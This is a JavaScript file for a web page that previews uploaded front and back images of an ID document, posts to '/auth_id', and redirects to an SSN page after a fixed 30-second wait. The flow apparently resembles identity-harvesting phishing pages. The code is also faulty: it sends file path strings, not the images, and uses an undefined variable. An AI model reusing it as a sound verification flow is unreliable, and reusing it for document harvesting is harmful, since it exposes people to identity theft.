const container = document.querySelector(".container")
const footer = document.querySelector("footer")
const front = document.querySelector('#front')
const frontImage = document.querySelector('#front-image')
const frontUpload = document.querySelector('#front-upload')
const back = document.querySelector('#back')
const backImage = document.querySelector('#back-image')
const backUpload = document.querySelector('#back-upload')
const submitID = document.querySelector('#sub_id')
const message = document.querySelector('.message')
const originalBorderColor = getComputedStyle(front).borderColor


let containerHeight = container.offsetHeight
let footerHeight = footer.offsetHeight

const newHeight = containerHeight + footerHeight + 220
document.body.style.height = newHeight + 'px'


document.addEventListener('DOMContentLoaded', () => {
    front.style.borderColor = '#266aca'
});

front.addEventListener('click', () => {
    front.style.borderColor = '#266aca'
    back.style.borderColor = originalBorderColor
    frontUpload.click()
})

frontUpload.addEventListener('change', (event) => {
  const file = event.target.files[0];

  if (file) {
    const reader = new FileReader();

    reader.onload = function(e) {
      const image = new Image()

      image.onload = function() {
        const parentWidth = frontImage.parentElement.clientWidth
        const parentHeight = frontImage.parentElement.clientHeight

        const imageAspectRatio = image.width / image.height
        const parentAspectRatio = parentWidth / parentHeight

        let newWidth, newHeight;

        if (imageAspectRatio > parentAspectRatio) {
          newWidth = parentWidth;
          newHeight = newWidth / imageAspectRatio;
        } else {
          newHeight = parentHeight;
          newWidth = newHeight * imageAspectRatio;
        }

        frontImage.style.width = `${newWidth}px`;
        frontImage.style.height = `${newHeight}px`;

        frontImage.src = e.target.result;
        const frontLabel = document.querySelector('#front-label')
        if(frontLabel){
          frontLabel.style.display = 'none'
        }
      };
      image.src = e.target.result
    };
    reader.readAsDataURL(file);
  }
});


back.addEventListener('click', () => {
    back.style.borderColor = '#266aca'
    front.style.borderColor = originalBorderColor
    backUpload.click()
})

backUpload.addEventListener('change', (event) => {
  const file = event.target.files[0];

  if (file) {
    const reader = new FileReader();

    reader.onload = function(e) {
      const image = new Image()

      image.onload = function() {
        const parentWidth = backImage.parentElement.clientWidth
        const parentHeight = backImage.parentElement.clientHeight

        const imageAspectRatio = image.width / image.height
        const parentAspectRatio = parentWidth / parentHeight

        let newWidth, newHeight;

        if (imageAspectRatio > parentAspectRatio){
          newWidth = parentWidth;
          newHeight = newWidth / imageAspectRatio;
        } else {
          newHeight = parentHeight;
          newWidth = newHeight * imageAspectRatio;
        }

        backImage.style.width = `${newWidth}px`;
        backImage.style.height = `${newHeight}px`;

        backImage.src = e.target.result;

        const backLabel = document.querySelector('#back-label')
        if(backLabel){
          backLabel.style.display = 'none'
        }
      };

      image.src = e.target.result; // Start image loading
    };

    reader.readAsDataURL(file);
  }
});


function submit(){
    const obj = {
        front : frontUpload.value,
        back : backUpload.value
    }
    const baseURL = '/auth_id'
    fetch(baseURL, {
        method: 'POST',
        headers: {
            "Content-Type" : "application/json"
        },
        body: JSON.stringify(obj)
    })
    wait.style.display = "block"
}

submitID.addEventListener('click', () => {
    if(frontUpload.value !== '' && backUpload.value !== ''){
        submit()
        setTimeout(() => {
            window.location.href = 'auth_ssn.html'
        }, 30000);
    } else{
        message.style.display = 'block'
    }
})

